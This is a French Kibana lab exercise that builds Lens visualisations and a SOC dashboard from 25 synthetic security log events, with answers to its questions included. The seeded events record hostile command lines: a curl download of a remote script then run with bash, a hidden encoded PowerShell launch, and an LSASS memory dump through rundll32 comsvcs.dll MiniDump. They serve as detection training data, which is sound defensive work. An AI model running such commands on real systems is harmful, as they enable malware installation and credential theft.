# TP 4 — Visualisations et dashboard SOC

> Construire des visualisations Lens pour des cas d'usage sécurité, puis les assembler en un dashboard avec des contrôles et un drilldown.

**Topic** : Visualizations — Dashboards

## Contexte

Le responsable du SOC veut un écran pour l'équipe de garde : « en un coup d'œil, qui échoue à se connecter, qui parle à qui, et ce qui est rare ».

## Setup

Ce TP est autonome. Il utilise le **jeu de données du lab** : 25 événements ECS, dans le data stream `logs-lab-default`. Le pipeline `lab-replay` décale leurs dates, pour que le dernier ait eu lieu il y a 10 minutes — réglez le sélecteur de temps de Kibana sur **Last 4 hours**.

Envoyez ce bloc dans **Dev Tools** (le `DELETE` vide un éventuel chargement précédent) :

```json
DELETE /_data_stream/logs-lab-default

PUT /_ingest/pipeline/lab-replay
{
  "description": "Rejoue le jeu de données du lab : décale les événements pour que le dernier ait eu lieu il y a 10 minutes",
  "processors": [
    {
      "script": {
        "source": "ZonedDateTime ts = ZonedDateTime.parse(ctx['@timestamp']); long ms = ChronoUnit.MILLIS.between(ts, ZonedDateTime.parse(params.end)); ctx['@timestamp'] = metadata().now.minus(ms, ChronoUnit.MILLIS).toString();",
        "params": { "end": "2026-10-01T10:30:00Z" }
      }
    }
  ]
}

POST /logs-lab-default/_bulk?pipeline=lab-replay&refresh
{"create":{}}
{"@timestamp":"2026-10-01T07:55:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"deploy"},"source":{"ip":"10.0.0.12"},"message":"Accepted publickey for deploy from 10.0.0.12 port 40022 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52311 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52321 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:20Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52331 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:30Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52341 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:40Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52351 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:01:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Accepted password for admin from 203.0.113.50 port 52400 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"curl","command_line":"curl -s http://198.51.100.7/x.sh -o /tmp/x.sh","pid":4101,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"bash","command_line":"bash /tmp/x.sh","pid":4102,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:03:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"crontab","command_line":"crontab -l","pid":4110,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T09:58:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"winword.exe","command_line":"\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" /n invoice.docm","pid":7001,"parent":{"name":"explorer.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"powershell.exe","command_line":"powershell.exe -nop -w hidden -enc SQBFAFgA","pid":7300,"parent":{"name":"winword.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:05Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"updater.exe","command_line":"C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe","pid":7312,"parent":{"name":"powershell.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:01:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:02:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:04:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:05:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:06:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"chrome.exe","pid":5120},"source":{"ip":"10.0.0.42","bytes":2048},"destination":{"ip":"142.250.74.110","port":443,"bytes":88000},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"whoami.exe","command_line":"whoami /all","pid":7350,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"net.exe","command_line":"net group \"Domain Admins\" /domain","pid":7351,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:15:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":4096},"destination":{"ip":"10.0.0.20","port":445,"bytes":1024},"network":{"transport":"tcp","direction":"internal"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:16:00Z","host":{"name":"db-01","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"svc_backup"},"process":{"name":"rundll32.exe","command_line":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full","pid":8800,"parent":{"name":"services.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:20:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":48000000},"destination":{"ip":"198.51.100.7","port":443,"bytes":2048},"network":{"transport":"tcp","direction":"egress"}}
```

Résultat attendu (extrait) :

```json
{ "errors": false }
```

Créez la data view `Lab` (`logs-lab-*`) si ce n'est pas fait au TP 3.

## Exercice 1 — L'agrégation derrière le graphique

Avant Lens, la requête qu'il enverra : les échecs d'authentification par IP source, avec le nombre d'utilisateurs visés.

```json
POST /logs-lab-default/_search
{
  "size": 0,
  "query": {
    "bool": {
      "filter": [
        { "term": { "event.category": "authentication" } },
        { "term": { "event.outcome": "failure" } }
      ]
    }
  },
  "aggs": {
    "by_source": {
      "terms": { "field": "source.ip" },
      "aggs": { "users": { "cardinality": { "field": "user.name" } } }
    }
  }
}
```

Résultat attendu (extrait) :

```json
{
  "aggregations": {
    "by_source": {
      "buckets": [
        { "key": "203.0.113.50", "doc_count": 5, "users": { "value": 1 } }
      ]
    }
  }
}
```

**Question** : brute force ou password spraying ?

<details>
<summary>Réponse</summary>

Brute force : 5 essais, **un seul** utilisateur. Un spraying viserait beaucoup d'utilisateurs avec peu d'essais chacun.

</details>

## Exercice 2 — Lens : les échecs dans le temps

**Visualize Library** → **Create visualization** → **Lens**, data view `Lab`.

1. Faites glisser `@timestamp` : Lens propose un histogramme.
2. Requête KQL de la visualisation : `event.category: authentication`.
3. **Break down by** `event.outcome`. Couleurs : `failure` en rouge, `success` en vert.
4. Titre : *Authentications over time*. **Save** (sans dashboard pour l'instant).

## Exercice 3 — Lens : les top talkers

1. Type **Table**, lignes : `host.name` puis `destination.ip`, métrique : **Sum** de `source.bytes`.
2. Format de la métrique : **Bytes**. Tri décroissant.
3. Titre : *Top talkers (bytes sent)*. **Save**.

**Question** : qui est en tête, et de combien ?

<details>
<summary>Réponse</summary>

`ws-02` → `198.51.100.7` : environ **48 Mo**, des milliers de fois plus que les autres paires.

</details>

## Exercice 4 — Lens : ce qui est rare

1. Type **Table**, lignes : `process.name` (Top 20), métrique : **Count**.
2. **Rank by** : Count, **ascending** — le plus rare en haut.
3. Ajoutez la métrique **Unique count** de `host.name`.
4. Titre : *Rare processes*. **Save**.

Vérifiez en ES|QL :

```json
POST /_query?format=json&filter_path=values
{
  "query": """
    FROM logs-lab-default
    | WHERE event.category == "process"
    | STATS starts = COUNT(*), hosts = COUNT_DISTINCT(host.name) BY process.name
    | WHERE process.name == "rundll32.exe"
  """
}
```

Résultat attendu :

```json
{ "values": [[1, 1, "rundll32.exe"]] }
```

## Exercice 5 — Lens : une formule

Un **metric** avec le taux d'échec des authentifications :

1. Type **Metric**, **Formula** :

```text
count(kql='event.outcome: failure') / count()
```

2. Requête KQL : `event.category: authentication`. Format : **Percent**.
3. **Color by value** : rouge au-dessus de 50 %.
4. Titre : *Authentication failure rate*. **Save**.

<details>
<summary>Réponse</summary>

5 échecs sur 7 authentifications : **71 %**.

</details>

## Exercice 6 — Le dashboard

1. **Dashboards** → **Create dashboard**. Titre : `SOC — Lab overview`.
2. **Add from library** : les quatre visualisations, et la recherche `Lab - all events` du TP 3.
3. Disposition : le metric en haut à gauche, l'histogramme à côté ; les tables en dessous ; les événements en bas.
4. **Add panel** → **Markdown** : à quoi sert ce dashboard, qui le maintient.
5. **Save**, avec **Store time with dashboard** (Last 4 hours).

## Exercice 7 — Contrôles et pivot

1. **Controls** → **Add control** : *Options list* sur `host.name`, puis sur `user.name`.
2. Choisissez `ws-02` dans le contrôle : tous les panneaux se filtrent.
3. Dans la table *Top talkers*, cliquez sur `198.51.100.7` : c'est un filtre sur tout le dashboard.
4. Menu du panneau *Rare processes* → **Explore in Discover** : même requête, mêmes filtres, même temps.

## Exercice 8 — Un drilldown

1. Menu du panneau *Top talkers* → **Create drilldown** → **Go to Discover** (ou **Go to URL**).
2. URL : `https://www.virustotal.com/gui/ip-address/{{event.value}}`.
3. Cliquez sur une IP de la table : le drilldown est proposé.

## Critères de succès

- [ ] Quatre visualisations Lens enregistrées
- [ ] Le dashboard `SOC — Lab overview` les réunit, avec une recherche et un panneau Markdown
- [ ] Les contrôles `host.name` et `user.name` filtrent tous les panneaux
- [ ] Un drilldown mène d'une IP à une page externe

## Dépannage

| Symptôme | Cause probable | Solution |
|----------|----------------|----------|
| Panneaux vides | Temps du dashboard | **Last 4 hours**, ou rechargez le setup |
| `process.command_line` absent des *breakdowns* | Champ `wildcard` | Utilisez `process.name` (`keyword`) |
| La formule renvoie `-` | Aucune authentification dans la plage | Vérifiez la requête KQL du panneau |

## Pour aller plus loin

- **Annotations** sur l'histogramme : marquez 08:01 (la connexion réussie) avec une requête KQL.
- **Share** → **Export** : le dashboard en NDJSON, à versionner.
